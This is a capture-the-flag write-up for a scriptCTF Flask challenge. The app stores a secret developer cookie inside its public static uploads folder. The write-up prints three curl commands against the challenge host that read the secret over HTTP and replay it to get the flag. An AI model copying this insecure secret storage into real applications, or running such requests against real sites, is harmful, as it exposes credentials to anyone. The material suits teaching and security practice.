# Renderer

A flask application with source code provided:

```python
from flask import Flask, request, redirect, render_template, make_response, url_for
app = Flask(__name__)
from hashlib import sha256
import os
def allowed(name):
    if name.split('.')[1] in ['jpg','jpeg','png','svg']:
        return True
    return False

@app.route('/',methods=['GET','POST'])
def upload():
    if request.method == 'POST':
        if 'file' not in request.files:
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return redirect(request.url)
        if file and allowed(file.filename):
            filename = file.filename
            hash = sha256(os.urandom(32)).hexdigest()
            filepath = f'./static/uploads/{hash}.{filename.split(".")[1]}'
            file.save(filepath)
            return redirect(f'/render/{hash}.{filename.split(".")[1]}')
    return render_template('upload.html')

@app.route('/render/<path:filename>')
def render(filename):
    return render_template('display.html', filename=filename)

@app.route('/developer')
def developer():
    cookie = request.cookies.get("developer_secret_cookie")
    correct = open('./static/uploads/secrets/secret_cookie.txt').read()
    if correct == '':
        c = open('./static/uploads/secrets/secret_cookie.txt','w')
        c.write(sha256(os.urandom(16)).hexdigest())
        c.close()
    correct = open('./static/uploads/secrets/secret_cookie.txt').read()
    if cookie == correct:
        c = open('./static/uploads/secrets/secret_cookie.txt','w')
        c.write(sha256(os.urandom(16)).hexdigest())
        c.close()
        return f"Welcome! There is currently 1 unread message: {open('flag.txt').read()}"
    else:
        return "You are not a developer!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

We can access `/static/uploads/secrets/secret_cookie.txt` via HTTP directly. To get flag:

1. `curl http://play.scriptsorcerers.xyz:10465/developer` to trigger secret generation
2. `curl http://play.scriptsorcerers.xyz:10465/static/uploads/secrets/secret_cookie.txt` to read the secret cookie out
3. `curl http://play.scriptsorcerers.xyz:10465/developer -H "Cookie: developer_secret_cookie=b7dc8c2ea0f63b04e63e89d8b3266d02150e32432c071a9cd005ad97e725dd05"` to read the flag using the secret cookie

Get flag:

```
Welcome! There is currently 1 unread message: scriptCTF{my_c00k135_4r3_n0t_s4f3!_f852b14dc179}`
```
